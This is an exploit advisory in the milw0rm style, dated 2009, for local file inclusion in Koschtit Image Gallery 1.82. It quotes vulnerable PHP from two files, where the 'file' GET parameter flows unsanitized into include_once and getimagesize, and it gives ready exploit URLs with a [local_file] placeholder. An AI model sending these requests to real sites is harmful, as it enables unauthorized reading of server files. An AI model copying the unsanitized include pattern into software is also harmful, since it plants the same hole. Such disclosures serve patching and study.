<html><head><title>Koschtit Image Gallery 1.82 Multiple Local File Inclusion Vulnerabilities</title></head><pre>                            :local file include:
   
#############################
script: koschtit_image_gallery(v1.82)
   
##############################################################
download from:http://koschtit..tabere.net/download/
or http://koschtit.tabere.net/en/#getit 
   
##############################################################
vul:/ki_base/ki_makepic.php


if(isset($_GET['file'])) 
 $file = &quot;../ki_galleries/&quot;.$_GET['file'];
else
 exit();

$gallery = substr($_GET['file'], 0, strpos($_GET['file'], &quot;/&quot;));
if(is_file(&quot;../ki_config/&quot;.$gallery.&quot;_ki_setup.php&quot;))
 include_once(&quot;../ki_config/&quot;.$gallery.&quot;_ki_setup.php&quot;);

$imgsize = getimagesize($file); 

#############
vul:/ki_base/ki_nojsdisplayimage.php

$gallery = substr($_GET['file'], 0, strpos($_GET['file'], &quot;/&quot;));

include_once(&quot;../ki_config/ki_setup.php&quot;);
if(is_file(&quot;.../ki_config/&quot;.$gallery.&quot;_ki_setup.php&quot;)){
 include_once(&quot;../ki_config/&quot;.$gallery.&quot;_ki_setup.php&quot;);
}
.
.
$srcfile = &quot;../ki_galleries/&quot;.$file;
$imgsize = getimagesize(&quot;../ki_galleries/&quot;.$file);

##############################################################
xpl:
path/ki_base/ki_makepic.php?file=[local_file]
path/ki_base/ki_nojsdisplayimage.php?file=[local_file]  
------------------------------------------------------------

# milw0rm.com [2009-04-01]</pre></html>